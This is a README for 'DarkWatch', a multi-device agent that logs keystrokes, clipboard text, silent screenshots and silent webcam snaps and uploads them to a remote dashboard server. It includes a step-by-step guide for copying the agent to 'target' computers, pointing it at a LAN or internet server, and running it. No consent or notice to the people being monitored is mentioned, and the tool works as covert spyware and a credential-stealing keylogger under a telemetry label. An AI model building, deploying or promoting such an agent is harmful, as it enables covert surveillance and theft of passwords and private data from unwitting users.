# DarkWatch Full-Spectrum Remote Endpoint Agent

Production-ready, multi-threaded endpoint agent designed to collect and stream complete system surveillance & telemetry to the central **DarkWatch Intelligence & Telemetry Suite**.

---

## 🚀 Full-Spectrum Monitored Modules
1. **Keystroke Stream (`pynput`)**: Real-time keystroke recording with active window title context headers, buffered and flushed periodically.
2. **Clipboard Monitor (`win32clipboard`)**: Real-time clipboard surveillance capturing newly copied strings with timestamps.
3. **Screen Grabs (`Pillow`)**: Periodic silent screenshots, compressed in-memory and uploaded to the server gallery.
4. **WebCam Snaps (`OpenCV`)**: Silent frame captures from available camera hardware.
5. **System Metrics (`psutil`)**: Live CPU %, RAM %, Disk capacity, active running processes, and active TCP network connections.

---

## 📦 Multi-Device Deployment Guide

### Step 1: Copy the `agent` Directory
Copy the entire `agent/` folder to each target client computer you wish to monitor.

### Step 2: Configure Server Hub Address
Open `agent/agent_config.json` on the client computer:
```json
{
  "server_base_url": "http://YOUR_SERVER_IP:5000",
  "agent_token": "DarkWatch-Telemetry-Key-2026",
  "poll_interval_seconds": 10,
  "modules": {
    "system_metrics": true,
    "keystrokes": true,
    "screenshots": true,
    "webcam": true,
    "clipboard": true
  },
  "intervals": {
    "metrics_seconds": 10,
    "data_flush_seconds": 30,
    "screenshot_seconds": 120,
    "webcam_seconds": 300
  }
}
```
* **Local LAN:** Replace `YOUR_SERVER_IP` with your dashboard machine's local IP (e.g. `http://192.168.1.100:5000`).
* **Remote Internet / Cloud:** Point to your server's Public IP, VPN IP, or VPS Domain (e.g. `http://203.0.113.50:5000`).

### Step 3: Run the Agent
* **Windows (1-Click):** Double click `run_agent.bat` (automatically installs dependencies and runs daemon).
* **Manual / Linux / macOS:**
  ```bash
  pip install requests psutil pynput Pillow opencv-python pywin32
  python telemetry_agent.py
  ```

---

## 🖥️ How Multiple Devices Work
* Each device automatically generates a unique, persistent Device ID (e.g. `laptop-a1b2c3d4`, `pc-e5f6g7h8`).
* All telemetry, keystrokes, clipboard text, screenshots, and webcam images are stored in separate directories on the server:
  `logs/remote/<device_id>/`
* In the dashboard's **Remote Endpoints** tab, you can seamlessly switch between all active devices in your fleet to inspect individual logs and galleries.
